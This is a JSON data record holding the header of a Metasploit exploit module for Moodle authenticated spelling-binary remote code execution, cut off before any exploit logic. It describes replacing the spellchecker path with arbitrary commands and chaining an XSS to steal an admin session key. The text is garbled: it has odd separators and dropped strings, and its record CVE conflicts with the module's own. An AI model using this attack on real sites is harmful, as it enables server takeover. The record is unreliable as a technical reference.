{
    "text": "vul_name : Moodle Authenticated Spelling Binary Remote Code Execution ， vul_cve : CVE-2021-21809 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， require 'rexml/document' ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， prepend Msf : Exploit : Remote : AutoCheck ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : Remote : HTTP : Moodle ， super (  ， update_info (  ， info ,  ， 'Name' => 'Moodle Authenticated Spelling Binary RCE' ,  ， 'Description' => %q{ ， Moodle allows an authenticated user to define spellcheck settings via the web interface. ， The user can update the spellcheck mechanism to point to a system-installed aspell binary. ， By updating the path for the spellchecker to an arbitrary command , an attacker can run ， arbitrary commands in the context of the web application upon spellchecking requests. ， This module also allows an attacker to leverage another privilege escalation vuln. ， Using the referenced XSS vuln , an unprivileged authenticated user can steal an admin sesskey ， and use this to escalate privileges to that of an admin , allowing the module to pop a shell ， as a previously unprivileged authenticated user. ， This module was tested against Moodle version 2.5.2 and 2.2.3. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => [  ， 'Brandon Perry <bperry.volatile [ at ] gmail.com>' # Discovery / msf module ，  ]  ,  ， ' ，  [ 'CVE' , '2013-3630' ]  ,  ，  [ 'CVE' , '2013-4341' ]  ,  # XSS ，  [ 'EDB' , '28174' ]  ,  # xss vuln allowing sesskey of admins to be stolen ，  [ 'URL' , ' ，  ]  ,  ， 'Payload' => { ， 'Compat' => ， { ， 'PayloadType' => 'cmd' ,  ， 'RequiredCmd' => 'generic perl ruby telnet python' ， } ， } ,  ， 'Platform' => [ 'unix' , 'linux' ]  ,  ， 'Arch' => ARCH_CMD ,  ， 'Targets' => [ 'Automatic' , {} ]  ,  ， 'DisclosureDate' => '2013-10-30' ,  ， 'DefaultTarget' => 0 ,  ， 'Notes' => { ， 'Stability' => [ CRASH_SAFE ]  ,  ， 'Reliability' => [ REPEATABLE_SESSION ]  ,  ， 'SideEffects' => [ CONFIG_CHANGES , IOC_IN_LOGS ]  ， } ， register_options (  ，  [  ， OptString.new ( 'USERNAME' ,  [ true , 'Username to authenticate with' , 'admin' ]  )  ,  ， OptString.new ( 'PASSWORD' ,  [ true , 'Password to authenticate with' , ' ]  )  ,  ， OptString.new ( 'SESSKEY' ,  [ false , 'The session key of the user to impersonate' , ' ]  )  ,  ， OptString.new ( 'TARGETURI' ,  [ true , 'The URI of the Moodle installation' , '/moodle/' ]  )  ，  ]  ， end ， def check",
    "time": "2021.10.12"
}